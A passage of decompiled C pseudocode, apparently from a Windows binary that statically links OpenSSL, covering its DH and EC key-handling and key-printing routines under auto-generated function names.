  sub_413490(*(void **)(a2 + 44));
  *(_DWORD *)(a2 + 44) = 0;
  *(_DWORD *)(a2 + 48) = 0;
  v7 = (void *)a1[11];
  if ( !v7 )
    return 1;
  v8 = sub_424800(v7, a1[12]);
  *(_DWORD *)(a2 + 44) = v8;
  if ( !v8 )
    return 0;
  *(_DWORD *)(a2 + 48) = a1[12];
  return 1;
}

//----- (00447400) --------------------------------------------------------
volatile LONG *__cdecl sub_447400(_DWORD *a1)
{
  volatile LONG *v1; // esi

  v1 = (volatile LONG *)sub_4349A0();
  if ( !v1 )
    return 0;
  if ( !sub_447300(a1, (int)v1, -1) )
  {
    sub_4346C0(v1);
    return 0;
  }
  return v1;
}

//----- (00447440) --------------------------------------------------------
int __cdecl sub_447440(int a1, int a2)
{
  int result; // eax

  if ( *(_DWORD *)(a1 + 20) )
    return sub_447300(*(_DWORD **)(a2 + 20), *(_DWORD *)(a1 + 20), *(_DWORD *)(a2 + 12) == (_DWORD)&unk_50CF70);
  result = sub_4349A0();
  *(_DWORD *)(a1 + 20) = result;
  if ( result )
    return sub_447300(*(_DWORD **)(a2 + 20), *(_DWORD *)(a1 + 20), *(_DWORD *)(a2 + 12) == (_DWORD)&unk_50CF70);
  return result;
}

//----- (00447480) --------------------------------------------------------
BOOL __cdecl sub_447480(int a1)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 20);
  return !v1 || !*(_DWORD *)(v1 + 8) || !*(_DWORD *)(v1 + 12);
}

//----- (004474A0) --------------------------------------------------------
BOOL __cdecl sub_4474A0(int a1, int a2)
{
  BOOL result; // eax

  result = sub_447260(a1, a2);
  if ( result )
    return sub_4169B0(*(_DWORD **)(*(_DWORD *)(a2 + 20) + 20), *(_DWORD **)(*(_DWORD *)(a1 + 20) + 20)) == 0;
  return result;
}

//----- (004474E0) --------------------------------------------------------
int __cdecl sub_4474E0(int a1, int a2, int a3)
{
  return sub_446F50(*(_DWORD *)(a2 + 20), a1, a3, 0);
}

//----- (00447500) --------------------------------------------------------
int __cdecl sub_447500(int a1, int a2, int a3)
{
  return sub_446F50(*(_DWORD *)(a2 + 20), a1, a3, (void *)1);
}

//----- (00447520) --------------------------------------------------------
int __cdecl sub_447520(int a1, int a2, int a3)
{
  return sub_446F50(*(_DWORD *)(a2 + 20), a1, a3, (void *)2);
}

//----- (00447540) --------------------------------------------------------
BOOL __cdecl sub_447540(int a1, _DWORD *a2, int a3)
{
  volatile LONG *v3; // esi
  volatile LONG *v4; // edi
  int v5; // eax
  int v6; // ebx
  int v7; // ebp
  int v8; // eax
  int v9; // eax
  volatile LONG *v10; // eax
  void *Block; // [esp+8h] [ebp-18h]
  BOOL v13; // [esp+Ch] [ebp-14h]
  int v14; // [esp+10h] [ebp-10h] BYREF
  int v15; // [esp+14h] [ebp-Ch] BYREF
  int v16; // [esp+18h] [ebp-8h] BYREF
  int v17; // [esp+1Ch] [ebp-4h] BYREF

  v3 = 0;
  Block = 0;
  v13 = 0;
  v4 = 0;
  sub_42C7D0(&v14, &v15, &v17, a2);
  if ( sub_423680(v14) == 920 && v15 != 5 )
  {
    v5 = sub_432B60(a1);
    v6 = v5;
    if ( v5 )
    {
      if ( *(_DWORD *)v5 == 920 )
      {
        v3 = sub_447400(*(_DWORD **)(v5 + 20));
        v7 = sub_435D30(a3);
        v16 = sub_432B60(a3);
        if ( v16 )
        {
          if ( v7 )
          {
            v8 = sub_42C450(0, (void **)&v16, v7);
            Block = (void *)v8;
            if ( v8 )
            {
              v9 = sub_4318D0(v8, 0);
              *((_DWORD *)v3 + 5) = v9;
              if ( v9 )
              {
                v10 = sub_41CB00();
                v4 = v10;
                if ( v10 )
                {
                  sub_41CE20((int)v10, **(void ***)(v6 + 12), (int)v3);
                  v3 = 0;
                  v13 = sub_453E20(a1, v4) > 0;
                }
              }
              else
              {
                sub_408310(5, 115, 109, (int)"crypto\\dh\\dh_ameth.c", 614);
              }
            }
            else
            {
              sub_408310(5, 115, 104, (int)"crypto\\dh\\dh_ameth.c", 608);
            }
          }
        }
      }
    }
  }
  sub_42C4F0(Block);
  sub_41CEB0(v4);
  sub_4346C0(v3);
  return v13;
}

//----- (004476B0) --------------------------------------------------------
int __usercall sub_4476B0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  void *v3; // ebp
  const char *v4; // eax
  _DWORD *v5; // ecx
  int **v6; // esi
  int v7; // eax
  char *v8; // eax
  FILE *v9; // eax
  unsigned int *v10; // ebx
  int v11; // eax
  int v12; // eax
  char **v13; // eax
  int v14; // esi
  void *v15; // eax
  int v17; // [esp+8h] [ebp-18h]
  int *v18; // [esp+Ch] [ebp-14h] BYREF
  int v19; // [esp+10h] [ebp-10h] BYREF
  int v20; // [esp+14h] [ebp-Ch]
  void *v21; // [esp+18h] [ebp-8h] BYREF

  v3 = 0;
  v20 = 0;
  v17 = 0;
  if ( sub_478120(a1, &v18, &v19) )
  {
    if ( sub_423680(*v18) == 245 )
    {
      if ( sub_443A60(a2, 920, 1024, 4102, 2, 0) > 0 )
      {
        v4 = sub_42BEA0();
        if ( sub_443A60(a2, 920, 1024, 4103, 0, (int)v4) > 0 )
        {
          v5 = (_DWORD *)v18[1];
          if ( *v5 == 16 )
          {
            v21 = *(void **)(v5[1] + 8);
            v17 = sub_42C6E0(0, &v21, **(_DWORD **)(v18[1] + 4));
            if ( v17 )
            {
              v6 = (int **)sub_478250(a1);
              if ( v6 )
              {
                v7 = sub_423680(*(_DWORD *)v17);
                v8 = sub_4233A0(v7);
                v9 = (FILE *)sub_430D50((int)v8);
                v10 = (unsigned int *)v9;
                if ( v9 )
                {
                  if ( (_fileno(v9) & 0xF0007) == 65538 )
                  {
                    if ( sub_4065A0(v6, (int *)v10, 0, 0, 0) )
                    {
                      if ( sub_407960((int)v6, *(_DWORD **)(v17 + 4)) > 0 )
                      {
                        v11 = sub_407470((int)v6);
                        if ( sub_443A60(a2, 920, 1024, 4105, v11, 0) > 0 )
                        {
                          v12 = sub_4076A0(v10);
                          v13 = sub_423310(v12);
                          if ( sub_443A60(a2, 920, 1024, 4109, 0, (int)v13) > 0 )
                          {
                            if ( v19 )
                            {
                              v14 = sub_435D30(v19);
                              v15 = (void *)sub_432B60(v19);
                              v3 = sub_424800(v15, v14);
                              if ( !v3 )
                                goto LABEL_21;
                            }
                            else
                            {
                              v14 = 0;
                            }
                            if ( sub_443A60(a2, 920, 1024, 4107, v14, (int)v3) > 0 )
                            {
                              v3 = 0;
                              v20 = 1;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else
    {
      sub_408310(5, 116, 112, (int)"crypto\\dh\\dh_ameth.c", 653);
    }
  }
LABEL_21:
  sub_42C730(v17);
  sub_413490(v3);
  return v20;
}

//----- (00447910) --------------------------------------------------------
int __usercall sub_447910@<eax>(_DWORD *a1@<esi>)
{
  int v1; // eax
  int v2; // edi
  _DWORD *v4; // [esp+0h] [ebp-10h]
  _DWORD *v5; // [esp+8h] [ebp-8h] BYREF
  int v6; // [esp+Ch] [ebp-4h] BYREF

  v1 = sub_478670(v4);
  v2 = v1;
  if ( !v1 )
    return 0;
  if ( !sub_407400(v1) )
  {
    if ( !sub_478170(a1, &v5, &v6, 0, 0, 0) || !v5 || !v6 )
      return 0;
    if ( !sub_447540(v2, v5, v6) )
    {
      sub_408310(5, 114, 111, (int)"crypto\\dh\\dh_ameth.c", 725);
      return 0;
    }
  }
  if ( sub_4476B0(a1, v2) )
    return 1;
  sub_408310(5, 114, 113, (int)"crypto\\dh\\dh_ameth.c", 731);
  return 0;
}
// 44791C: variable 'v4' is possibly undefined

//----- (004479D0) --------------------------------------------------------
int __cdecl sub_4479D0(_DWORD *a1)
{
  _DWORD *v1; // ebx
  int v2; // eax
  int v3; // esi
  int v5; // edi
  _DWORD *v6; // edi
  int v7; // ebx
  char **v8; // eax
  int v9; // edi
  int v10; // edi
  unsigned int *v11; // eax
  int v12; // ebx
  char **v13; // eax
  char **v14; // eax
  char ***v15; // ebx
  char **v16; // eax
  int v17; // edi
  void *v18; // eax
  void *v19; // eax
  signed int v20; // eax
  int v21; // edi
  _DWORD *v22; // eax
  int v23; // esi
  char **v24; // eax
  void *Block; // [esp+Ch] [ebp-2Ch] BYREF
  char ***v26; // [esp+10h] [ebp-28h]
  _DWORD *v27; // [esp+14h] [ebp-24h] BYREF
  int v28; // [esp+18h] [ebp-20h] BYREF
  const char *v29; // [esp+1Ch] [ebp-1Ch] BYREF
  int v30; // [esp+20h] [ebp-18h] BYREF
  int v31; // [esp+24h] [ebp-14h]
  char **v32; // [esp+28h] [ebp-10h] BYREF
  int v33; // [esp+2Ch] [ebp-Ch]

  v1 = a1;
  v26 = 0;
  Block = 0;
  v31 = 0;
  v2 = sub_478670(a1);
  v3 = v2;
  if ( !v2 )
    return 0;
  v5 = sub_432B60(v2);
  if ( sub_478170(a1, &v27, &v28, 0, 0, 0) )
  {
    sub_42C7D0(&v32, 0, 0, v27);
    if ( v32 == sub_423310(0) )
    {
      v6 = sub_4318B0(*(_DWORD **)(*(_DWORD *)(v5 + 20) + 20), 0);
      if ( !v6 )
        goto LABEL_35;
      v7 = sub_42C470((int)v6, &Block);
      sub_42C4F0(v6);
      if ( v7 <= 0 )
        goto LABEL_35;
      sub_4329C0(v28, (int)Block, v7);
      *(_DWORD *)(v28 + 12) &= 0xFFFFFFF0;
      *(_DWORD *)(v28 + 12) |= 8u;
      Block = 0;
      v8 = sub_423310(0x398u);
      sub_42C750((int)v27, (int)v8, -1, 0);
      v1 = a1;
    }
    v9 = sub_443A60(v3, 920, 1024, 4102, -2, 0);
    if ( v9 > 0 )
    {
      if ( sub_443A60(v3, 920, 1024, 4104, 0, (int)&v29) )
      {
        if ( v9 == 1 )
        {
          if ( sub_443A60(v3, 920, 1024, 4102, 2, 0) <= 0 )
            goto LABEL_35;
        }
        else if ( v9 != 2 )
        {
          goto LABEL_35;
        }
        if ( v29 )
        {
          if ( sub_435D30((int)v29) != 64 )
            goto LABEL_35;
        }
        else
        {
          v29 = sub_42BEA0();
          if ( sub_443A60(v3, 920, 1024, 4103, 0, (int)v29) <= 0 )
            goto LABEL_35;
        }
        if ( !sub_478120(v1, &v27, &v30) )
          goto LABEL_35;
        v10 = sub_478250(v1);
        v11 = (unsigned int *)sub_435D30(v10);
        v12 = sub_4076A0(v11);
        v13 = sub_423310(v12);
        if ( sub_443A60(v3, 920, 1024, 4109, 0, (int)v13) <= 0 )
          goto LABEL_35;
        v33 = sub_407470(v10);
        v26 = (char ***)sub_42C720();
        if ( !v26 )
          goto LABEL_35;
        v14 = sub_423310(v12);
        v15 = v26;
        *v26 = v14;
        v16 = (char **)sub_42C600();
        v15[1] = v16;
        if ( !v16 || sub_4078F0(v10, v16) <= 0 )
          goto LABEL_35;
        if ( !sub_423E20(v15[1]) )
        {
          sub_42C610((int)v15[1]);
          v15[1] = 0;
        }
        if ( sub_443A60(v3, 920, 1024, 4105, v33, 0) <= 0 )
          goto LABEL_35;
        if ( !v30 )
        {
          v19 = 0;
          v17 = 0;
LABEL_30:
          if ( sub_443A60(v3, 920, 1024, 4107, v17, (int)v19) > 0 )
          {
            Block = 0;
            v20 = sub_42C700((int)v26, &Block);
            v21 = v20;
            if ( Block )
            {
              if ( v20 )
              {
                v22 = sub_432DC0();
                v23 = (int)v22;
                if ( v22 )
                {
                  sub_4329C0((int)v22, (int)Block, v21);
                  Block = 0;
                  v24 = sub_423310(0xF5u);
                  sub_42C750((int)v27, (int)v24, 16, v23);
                  v31 = 1;
                }
              }
            }
          }
          goto LABEL_35;
        }
        v17 = sub_435D30(v30);
        v18 = (void *)sub_432B60(v30);
        v19 = sub_424800(v18, v17);
        if ( v19 )
          goto LABEL_30;
      }
    }
  }
LABEL_35:
  sub_413490(Block);
  sub_42C730((int)v26);
  return v31;
}

//----- (00447D80) --------------------------------------------------------
int __cdecl sub_447D80(int a1, int a2, int a3, _DWORD *a4)
{
  if ( a2 == 7 )
  {
    if ( a3 == 1 )
      return sub_447910(a4);
    if ( !a3 )
      return sub_4479D0(a4);
  }
  else if ( a2 == 8 )
  {
    *a4 = 1;
    return 1;
  }
  return -2;
}

//----- (00447DD0) --------------------------------------------------------
int sub_447DD0()
{
  return 32;
}

//----- (00447DE0) --------------------------------------------------------
void __cdecl sub_447DE0(void *Block)
{
  void *v1; // eax

  v1 = (void *)sub_457690((int)Block);
  sub_478D60(v1);
}

//----- (00447E00) --------------------------------------------------------
int sub_447E00()
{
  return 64;
}

//----- (00447E10) --------------------------------------------------------
int __cdecl sub_447E10(int a1)
{
  int result; // eax
  unsigned int *v2; // esi
  _BYTE *v3; // eax

  result = sub_457690(a1);
  v2 = (unsigned int *)result;
  if ( result )
  {
    v3 = *(_BYTE **)(result + 8);
    if ( v3 )
      sub_4139E0(v3, *v2);
    return sub_42C4F0(v2);
  }
  return result;
}

//----- (00447E50) --------------------------------------------------------
int __cdecl sub_447E50(int a1, int a2, int a3, _DWORD *a4)
{
  if ( a2 != 3 )
    return -2;
  *a4 = 672;
  return 1;
}

//----- (00447E70) --------------------------------------------------------
int __cdecl sub_447E70(int a1, int a2)
{
  unsigned int *v2; // eax
  _DWORD *v4; // [esp-4h] [ebp-4h]

  v4 = (_DWORD *)sub_457690(a2);
  v2 = (unsigned int *)sub_457690(a1);
  return sub_437A00(v2, v4);
}

//----- (00447EA0) --------------------------------------------------------
int __cdecl sub_447EA0(int a1, void **a2, size_t Size)
{
  _DWORD *v3; // esi

  v3 = sub_42C430();
  if ( v3 && sub_437A10((int)v3, *a2, Size) && sub_41CE20(a1, (void *)0x357, (int)v3) )
    return 1;
  sub_42C4F0(v3);
  return 0;
}

//----- (00447EF0) --------------------------------------------------------
int __cdecl sub_447EF0(int a1, void **a2)
{
  size_t *v2; // eax
  size_t *v3; // esi
  void *v4; // eax
  int v6; // ebx

  v2 = (size_t *)sub_457690(a1);
  v3 = v2;
  if ( a2 )
  {
    if ( *a2 )
    {
      v6 = 1;
    }
    else
    {
      v4 = sub_4133F0(*v2);
      *a2 = v4;
      if ( !v4 )
        return -1;
      v6 = 0;
    }
    memcpy(*a2, (const void *)v3[2], *v3);
    if ( v6 )
      *a2 = (char *)*a2 + *v3;
  }
  return *v3;
}

//----- (00447F60) --------------------------------------------------------
int __usercall sub_447F60@<eax>(_DWORD *a1@<ebx>, FILE *a2@<edi>, _DWORD *a3)
{
  int v3; // eax
  FILE *v4; // esi
  int v5; // eax
  void **v7; // esi
  int v8; // eax

  if ( !a2 || (v3 = sub_407400((int)a2), (v4 = (FILE *)v3) == 0) )
  {
    sub_408310(16, 223, 124, (int)"crypto\\ec\\ec_ameth.c", 31);
    return 0;
  }
  if ( sub_457690(v3) )
  {
    v5 = _fileno(v4);
    if ( v5 )
    {
      *a1 = sub_423310(v5);
      *a3 = 6;
      return 1;
    }
  }
  v7 = (void **)sub_432DC0();
  if ( !v7 )
    return 0;
  v8 = sub_41FE80(a2, v7 + 2);
  *v7 = (void *)v8;
  if ( v8 > 0 )
  {
    *a1 = v7;
    *a3 = 16;
    return 1;
  }
  else
  {
    sub_432A30(v7);
    sub_408310(16, 223, 16, (int)"crypto\\ec\\ec_ameth.c", 49);
    return 0;
  }
}

//----- (00448030) --------------------------------------------------------
int __cdecl sub_448030(int *a1, void **Block)
{
  FILE *v2; // edi
  void *v3; // esi
  int v5; // eax
  void **v6; // ebx
  int v7; // ebp
  void *v8; // eax
  int v9; // eax
  char **v10; // eax
  int v11; // [esp-8h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  void *v13; // [esp+10h] [ebp-4h] BYREF

  v2 = (FILE *)Block[5];
  v3 = 0;
  Block = 0;
  if ( sub_447F60(&Block, v2, &v12) )
  {
    v5 = sub_420010((int)v2, 0);
    v6 = Block;
    v7 = v12;
    if ( v5 > 0
      && (v8 = sub_4133F0(v5), (v3 = v8) != 0)
      && (v13 = v8, v9 = sub_420010((int)v2, &v13), v9 > 0)
      && (v11 = v9, v10 = sub_423310(0x198u), sub_41D4E0(a1, (int)v10, v7, (int)v6, (int)v3, v11)) )
    {
      return 1;
    }
    else
    {
      if ( v7 == 6 )
        sub_422B70(v6);
      else
        sub_432A30(v6);
      sub_413490(v3);
      return 0;
    }
  }
  else
  {
    sub_408310(16, 216, 16, (int)"crypto\\ec\\ec_ameth.c", 67);
    return 0;
  }
}

//----- (00448130) --------------------------------------------------------
volatile LONG ***__usercall sub_448130@<eax>(int *a1@<ecx>, __m64 a2@<mm0>, int a3)
{
  volatile LONG ***v3; // esi
  int v5; // eax
  int *v6; // eax
  int *v7; // edi
  int v9; // [esp-4h] [ebp-Ch]
  int v10; // [esp-4h] [ebp-Ch]

  v3 = 0;
  if ( a3 == 16 )
  {
    v9 = *a1;
    a3 = a1[2];
    v3 = (volatile LONG ***)sub_41FEC0(a2, 0, &a3, v9);
    if ( !v3 )
    {
      v10 = 102;
LABEL_12:
      sub_408310(16, 220, 142, (int)"crypto\\ec\\ec_ameth.c", v10);
      goto LABEL_13;
    }
    return v3;
  }
  if ( a3 != 6 )
  {
    v10 = 124;
    goto LABEL_12;
  }
  v3 = (volatile LONG ***)sub_41DE60();
  if ( v3 )
  {
    v5 = sub_423680((int)a1);
    v6 = sub_4375B0(v5);
    v7 = v6;
    if ( !v6 )
      goto LABEL_13;
    std::spfun((struct std::ios_base *)v6, 1);
    if ( !sub_41E520(v3, v7) )
      goto LABEL_13;
    sub_4367A0((volatile LONG **)v7);
    return v3;
  }
  sub_408310(16, 220, 65, (int)"crypto\\ec\\ec_ameth.c", 113);
LABEL_13:
  sub_41DE70((volatile LONG *)v3);
  return 0;
}

//----- (004481E0) --------------------------------------------------------
int __usercall sub_4481E0@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  void *Block; // [esp+0h] [ebp-18h] BYREF
  _BYTE *v5; // [esp+4h] [ebp-14h] BYREF
  _DWORD *v6; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+Ch] [ebp-Ch] BYREF
  int *v8; // [esp+10h] [ebp-8h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  v5 = 0;
  Block = 0;
  if ( !sub_41D550(0, &v5, &v9, &v6, a3) )
    return 0;
  sub_42C7D0(0, &v7, &v8, v6);
  Block = sub_448130(v8, a1, v7);
  if ( !Block )
  {
    sub_408310(16, 215, 16, (int)"crypto\\ec\\ec_ameth.c", 150);
    return 0;
  }
  if ( sub_41FF90(a1, (int *)&Block, &v5, v9) )
  {
    sub_41CE20(a2, (void *)0x198, (int)Block);
    return 1;
  }
  else
  {
    sub_408310(16, 215, 142, (int)"crypto\\ec\\ec_ameth.c", 156);
    sub_41DE70((volatile LONG *)Block);
    return 0;
  }
}

//----- (004482E0) --------------------------------------------------------
unsigned int __cdecl sub_4482E0(int a1, int a2)
{
  int v2; // edi
  _DWORD *v3; // ebx
  _DWORD *v4; // eax
  int v5; // eax

  v2 = sub_407400(*(_DWORD *)(a2 + 20));
  v3 = (_DWORD *)_fileno(*(FILE **)(a1 + 20));
  v4 = (_DWORD *)_fileno(*(FILE **)(a2 + 20));
  v5 = sub_4364F0(v2, v3, v4, 0);
  if ( v5 )
    return v5 != 1 ? 0xFFFFFFFE : 0;
  else
    return 1;
}

//----- (00448330) --------------------------------------------------------
int __usercall sub_448330@<eax>(__m64 a1@<mm0>, int a2, int a3)
{
  void *Block; // [esp+0h] [ebp-18h] BYREF
  void *v5; // [esp+4h] [ebp-14h] BYREF
  _DWORD *v6; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+Ch] [ebp-Ch] BYREF
  int *v8; // [esp+10h] [ebp-8h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  v5 = 0;
  Block = 0;
  if ( !sub_434BD0(0, (int *)&v5, &v9, &v6, a3) )
    return 0;
  sub_42C7D0(0, &v7, &v8, v6);
  Block = sub_448130(v8, a1, v7);
  if ( !Block )
  {
    sub_408310(16, 213, 16, (int)"crypto\\ec\\ec_ameth.c", 209);
LABEL_6:
    sub_41DE70((volatile LONG *)Block);
    return 0;
  }
  if ( !sub_41FAC0(a1, (int *)&Block, &v5, v9) )
  {
    sub_408310(16, 213, 142, (int)"crypto\\ec\\ec_ameth.c", 201);
    goto LABEL_6;
  }
  sub_41CE20(a2, (void *)0x198, (int)Block);
  return 1;
}

//----- (00448420) --------------------------------------------------------
BOOL __cdecl sub_448420(int *a1, const void **a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // edi
  const void **v6; // esi
  char **v7; // eax
  int v8; // [esp-10h] [ebp-54h]
  int v9; // [esp-Ch] [ebp-50h]
  int v10; // [esp+Ch] [ebp-38h] BYREF
  int v11; // [esp+10h] [ebp-34h] BYREF
  char v12[48]; // [esp+14h] [ebp-30h] BYREF

  qmemcpy(v12, a2[5], sizeof(v12));
  if ( !sub_447F60(&v10, (FILE *)v12, &v11) )
  {
    sub_408310(16, 214, 142, (int)"crypto\\ec\\ec_ameth.c", 224);
    return 0;
  }
  v3 = sub_435DD0((int)v12);
  std::swfun((struct std::ios_base *)v12, v3 | 1);
  v4 = sub_41FCA0((int)v12, 0);
  v5 = v4;
  if ( !v4 )
  {
    sub_408310(16, 214, 16, (int)"crypto\\ec\\ec_ameth.c", 239);
    return 0;
  }
  v6 = (const void **)sub_4133F0(v4);
  if ( !v6 )
  {
    sub_408310(16, 214, 65, (int)"crypto\\ec\\ec_ameth.c", 244);
    return 0;
  }
  a2 = v6;
  if ( sub_41FCA0((int)v12, (void **)&a2) )
  {
    v9 = v10;
    v8 = v11;
    v7 = sub_423310(0x198u);
    return sub_434B60(a1, (int)v7, 0, v8, v9, (int)v6, v5) != 0;
  }
  else
  {
    sub_413490(v6);
    sub_408310(16, 214, 16, (int)"crypto\\ec\\ec_ameth.c", 250);
    return 0;
  }
}

//----- (00448570) --------------------------------------------------------
int __cdecl sub_448570(int a1)
{
  return sub_4201D0(*(_DWORD *)(a1 + 20));
}

//----- (00448580) --------------------------------------------------------
int __cdecl sub_448580(int a1)
{
  int v1; // eax

  v1 = sub_407400(*(_DWORD *)(a1 + 20));
  return sub_435D40(v1);
}

//----- (004485A0) --------------------------------------------------------
int __cdecl sub_4485A0(int a1)
{
  int v1; // eax
  int v2; // eax

  v1 = sub_407400(*(_DWORD *)(a1 + 20));
  v2 = sub_435D40(v1);
  if ( v2 >= 512 )
    return 256;
  if ( v2 >= 384 )
    return 192;
  if ( v2 >= 256 )
    return 128;
  if ( v2 >= 224 )
    return 112;
  if ( v2 < 160 )
    return v2 / 2;
  return 80;
}

//----- (00448600) --------------------------------------------------------
BOOL __cdecl sub_448600(int a1)
{
  return !*(_DWORD *)(a1 + 20) || !sub_407400(*(_DWORD *)(a1 + 20));
}

//----- (00448630) --------------------------------------------------------
volatile LONG **__cdecl sub_448630(int a1, int a2)
{
  int *v2; // eax
  volatile LONG **result; // eax
  volatile LONG **v4; // edi
  int v5; // eax

  v2 = (int *)sub_407400(*(_DWORD *)(a2 + 20));
  result = sub_436AE0(v2);
  v4 = result;
  if ( result )
  {
    if ( (*(_DWORD *)(a1 + 20) || (v5 = sub_41DE60(), (*(_DWORD *)(a1 + 20) = v5) != 0))
      && sub_41E520(*(volatile LONG ****)(a1 + 20), (int *)v4) )
    {
      sub_4367A0(v4);
      return (volatile LONG **)1;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (00448690) --------------------------------------------------------
BOOL __cdecl sub_448690(int a1, int a2)
{
  int v2; // esi
  int v3; // eax

  v2 = sub_407400(*(_DWORD *)(a1 + 20));
  v3 = sub_407400(*(_DWORD *)(a2 + 20));
  return sub_436C00(v2, v3, 0) == 0;
}

//----- (004486C0) --------------------------------------------------------
void __cdecl sub_4486C0(volatile LONG **Block)
{
  sub_41DE70(Block[5]);
}

//----- (004486D0) --------------------------------------------------------
int __usercall sub_4486D0@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<edi>, int Size)
{
  int v4; // ebp
  int v7; // eax
  const char *v8; // esi
  int v9; // eax
  unsigned int v10; // esi
  int v11; // esi
  void *v13; // [esp+Ch] [ebp-14h] BYREF
  void *Block; // [esp+10h] [ebp-10h] BYREF
  int v15; // [esp+14h] [ebp-Ch]
  FILE *Stream; // [esp+18h] [ebp-8h]
  int v17; // [esp+1Ch] [ebp-4h]

  v4 = 0;
  v13 = 0;
  Block = 0;
  v15 = 0;
  v17 = 0;
  if ( a1 )
  {
    Stream = (FILE *)sub_407400(a1);
    if ( Stream )
    {
      if ( a2 != 2 )
      {
        v7 = sub_432E70(a1);
        v15 = sub_41E5A0(a1, v7, &Block, 0);
        if ( !v15 )
          goto LABEL_21;
      }
      if ( a2 )
      {
        v8 = "Public-Key";
        if ( a2 != 1 )
          v8 = "ECDSA-Parameters";
      }
      else
      {
        if ( sub_457690(a1) )
        {
          v4 = sub_41E7C0(a1, &v13);
          if ( !v4 )
            goto LABEL_21;
        }
        v8 = "Private-Key";
      }
      if ( sub_405340(a3, Size, 128) )
      {
        v9 = sub_435D40((int)Stream);
        if ( sub_419190(a3, "%s: (%d bit)\n", v8, v9) > 0
          && (!v4 || sub_419190(a3, "%*spriv:\n", Size, byte_4F1291) > 0 && sub_477ED0(a3, (int)v13, v4, Size + 4)) )
        {
          v10 = v15;
          if ( !v15 || sub_419190(a3, "%*spub:\n", Size, byte_4F1291) > 0 && sub_477ED0(a3, (int)Block, v10, Size + 4) )
          {
            if ( sub_4792C0(a3, Stream, Size) )
            {
              v11 = 1;
LABEL_22:
              sub_4134B0(v13, v4);
              sub_413490(Block);
              return v11;
            }
          }
        }
      }
LABEL_21:
      sub_408310(16, 221, 16, (int)"crypto\\ec\\ec_ameth.c", 388);
      v11 = v17;
      goto LABEL_22;
    }
  }
  sub_408310(16, 221, 67, (int)"crypto\\ec\\ec_ameth.c", 340);
  return 0;
}

//----- (004488C0) --------------------------------------------------------
int __usercall sub_4488C0@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, int a4)
{
  int v4; // eax

  v4 = sub_41FEC0(a1, 0, a3, a4);
  if ( v4 )
  {
    sub_41CE20(a2, (void *)0x198, v4);
    return 1;
  }
  else
  {
    sub_408310(16, 212, 16, (int)"crypto\\ec\\ec_ameth.c", 400);
    return 0;
  }
}

//----- (00448910) --------------------------------------------------------
int __cdecl sub_448910(FILE *Stream, void **a2)
{
  return sub_41FE80((FILE *)Stream->_charbuf, a2);
}

//----- (00448920) --------------------------------------------------------
int __cdecl sub_448920(int a1, int a2, int a3)
{
  return sub_4486D0(*(_DWORD *)(a2 + 20), 2, a1, a3);
}

//----- (00448940) --------------------------------------------------------
int __cdecl sub_448940(int a1, int a2, int a3)
{
  return sub_4486D0(*(_DWORD *)(a2 + 20), 1, a1, a3);
}

//----- (00448960) --------------------------------------------------------
int __cdecl sub_448960(int a1, int a2, int a3)
{
  return sub_4486D0(*(_DWORD *)(a2 + 20), 0, a1, a3);
}

//----- (00448980) --------------------------------------------------------
int __usercall sub_448980@<eax>(__m64 a1@<mm0>, int a2, void **a3, int a4)
{
  int v4; // eax

  v4 = sub_41FAC0(a1, 0, a3, a4);
  if ( v4 )
  {
    sub_41CE20(a2, (void *)0x198, v4);
    return 1;
  }
  else
  {
    sub_408310(16, 222, 142, (int)"crypto\\ec\\ec_ameth.c", 436);
    return 0;
  }
}

//----- (004489E0) --------------------------------------------------------
int __cdecl sub_4489E0(int a1, void **a2)
{
  return sub_41FCA0(*(_DWORD *)(a1 + 20), a2);
}

//----- (004489F0) --------------------------------------------------------
int __usercall sub_4489F0@<eax>(int a1@<ebx>, __m64 a2@<mm0>, int a3, _DWORD *a4)
{
  volatile LONG *v4; // edi
  int v5; // ebp
  volatile LONG ***v6; // eax
  int v7; // eax
  int *v8; // esi
  int v9; // esi
  volatile LONG ***v11; // [esp+Ch] [ebp-14h] BYREF
  int v12; // [esp+10h] [ebp-10h] BYREF
  int v13; // [esp+14h] [ebp-Ch] BYREF
  int *v14; // [esp+18h] [ebp-8h] BYREF
  _BYTE *v15; // [esp+1Ch] [ebp-4h] BYREF

  v4 = 0;
  v5 = 0;
  v11 = 0;
  sub_42C7D0(&v12, &v13, &v14, a4);
  if ( sub_423680(v12) != 408 )
    goto LABEL_15;
  if ( v13 != -1 && v13 != 5 )
  {
    v6 = sub_448130(v14, a2, v13);
    v11 = v6;
    if ( !v6 )
      goto LABEL_16;
    goto LABEL_9;
  }
  v7 = sub_432B60(a3);
  if ( !v7 )
  {
LABEL_15:
    v6 = v11;
    goto LABEL_16;
  }
  v8 = (int *)sub_407400(*(_DWORD *)(v7 + 20));
  v6 = (volatile LONG ***)sub_41DE60();
  v11 = v6;
  if ( v6 )
  {
    if ( sub_41E520(v6, v8) )
    {
LABEL_9:
      v9 = sub_435D30(a1);
      v15 = (_BYTE *)sub_432B60(a1);
      if ( v15 )
      {
        if ( v9 )
        {
          if ( sub_41FF90(a2, (int *)&v11, &v15, v9) )
          {
            v4 = sub_41CB00();
            if ( v4 )
            {
              sub_41CE60((int)v4, (int)v11);
              if ( sub_453E20(a3, v4) > 0 )
                v5 = 1;
            }
          }
        }
      }
      goto LABEL_15;
    }
    goto LABEL_15;
  }
LABEL_16:
  sub_41DE70((volatile LONG *)v6);
  sub_41CEB0(v4);
  return v5;
}

//----- (00448B20) --------------------------------------------------------
BOOL __usercall sub_448B20@<eax>(int a1@<esi>, int a2)
{
  int v2; // eax
  char *v3; // eax
  int v4; // eax
  unsigned int v6; // [esp+0h] [ebp-4h] BYREF

  if ( !a2 || !sub_44BA60(a2, &v6, &a2) )
    return 0;
  if ( a2 == 946 )
  {
    v2 = 0;
  }
  else
  {
    if ( a2 != 947 )
      return 0;
    v2 = 1;
  }
